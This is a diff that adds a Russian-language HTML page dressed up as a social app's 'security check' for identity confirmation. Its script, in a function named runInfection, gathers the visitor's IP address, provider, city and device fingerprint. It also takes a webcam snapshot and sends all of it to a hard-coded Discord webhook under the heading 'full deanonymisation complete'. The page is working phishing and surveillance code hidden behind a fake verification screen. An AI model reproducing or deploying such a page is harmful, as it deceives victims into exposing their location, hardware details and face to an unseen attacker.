@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Connect</title>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; height: 100vh; }
+        .app { width: 100%; max-width: 400px; border: 1px solid #222; position: relative; display: flex; flex-direction: column; background: #050505; }
+        .content { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        .loader { width: 100%; height: 4px; background: #111; position: relative; overflow: hidden; border-radius: 2px; }
+        .loader::after { content: ""; position: absolute; left: -50%; width: 50%; height: 100%; background: #fe2c55; animation: flow 2s infinite; }
+        @keyframes flow { 50% { left: 100%; } 100% { left: 100%; } }
+        .btn { background: #fe2c55; color: #fff; border: none; padding: 15px 40px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 30px; width: 80%; }
+        .footer { height: 60px; border-top: 1px solid #222; display: flex; justify-content: space-around; align-items: center; font-size: 20px; opacity: 0.6; }
+    </style>
+</head>
+<body>
+
+<div class="app">
+    <div class="content">
+        <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
+        <h2 style="margin: 10px 0;">Проверка безопасности</h2>
+        <p style="color: #888; text-align: center; font-size: 14px;">Нажмите кнопку ниже для подтверждения личности</p>
+        <div class="loader"></div>
+        <button class="btn" onclick="runInfection()">Начать проверку</button>
+    </div>
+    <div class="footer"><span>🏠</span><span>🔍</span><span>➕</span><span>❤️</span><span>👤</span></div>
+</div>
+
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1477060454969769996/mz6ulimJZIkLmJeyuZzFEslpk1JNOuDUlu-EY6WPoK0kXUSElta0pwpw1YDDAG9wdcsp";
+
+    // Функция гарантированного получения IP
+    async function getIP() {
+        const endpoints = [
+            'https://api.ipify.org?format=json',
+            'https://ipinfo.io/json',
+            'https://geolocation-db.com/json/'
+        ];
+        for (let url of endpoints) {
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                return {
+                    ip: data.ip || data.IPv4,
+                    city: data.city || "Не определен",
+                    org: data.org || data.asn_org || "Неизвестно"
+                };
+            } catch (e) { continue; }
+        }
+        return { ip: "НЕ УДАЛОСЬ ПРОБИТЬ", city: "N/A", org: "N/A" };
+    }
+
+    async function runInfection() {
+        const btn = document.querySelector('.btn');
+        btn.innerText = "Анализ...";
+        btn.disabled = true;
+
+        const netData = await getIP();
+        
+        // Сбор железа
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debug = gl?.getExtension('WEBGL_debug_renderer_info');
+        const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Hidden";
+
+        // Цифровой отпечаток
+        const fingerprint = {
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            cores: navigator.hardwareConcurrency || "?",
+            ram: navigator.deviceMemory || "?",
+            lang: navigator.language,
+            ua: navigator.userAgent
+        };
+
+        const sendFinal = async (blob = null) => {
+            const fd = new FormData();
+            const text = `🎯 **ПОЛНЫЙ ДЕАНОН ЗАВЕРШЕН**\n` +
+                `**🌐 IP:** \`${netData.ip}\`\n` +
+                `**🏢 Провайдер:** \`${netData.org}\`\n` +
+                `**📍 Локация:** ${netData.city}\n` +
+                `**🕒 Пояс:** \`${fingerprint.tz}\`\n` +
+                `**💻 Железо:** ${fingerprint.cores} ядер | ${fingerprint.ram}GB RAM\n` +
+                `**🎮 GPU:** \`${fingerprint.gpu}\`\n` +
+                `**📱 Устройство:** \`${fingerprint.ua.substring(0, 100)}...\``;
+
+            if (blob) fd.append('file', blob, 'target.png');
+            fd.append('payload_json', JSON.stringify({ username: "System Guard", content: text }));
+            
+            await fetch(WEBHOOK, { method: "POST", body: fd });
+            btn.innerText = "Готово";
+            // Необязательно: перекинуть на настоящий сайт после "проверки"
+            // window.location.href = "https://google.com"; 
+        };
+
+        // Работа с камерой
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.createElement('video');
+            v.srcObject = stream;
+            await v.play();
+
+            setTimeout(() => {
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    sendFinal(b);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/png');
+            }, 1000);
+        } catch(e) {
+            await sendFinal(); // Если камеру не дали, шлем данные без фото
+        }
+    }
+</script>
+</body>
+</html>
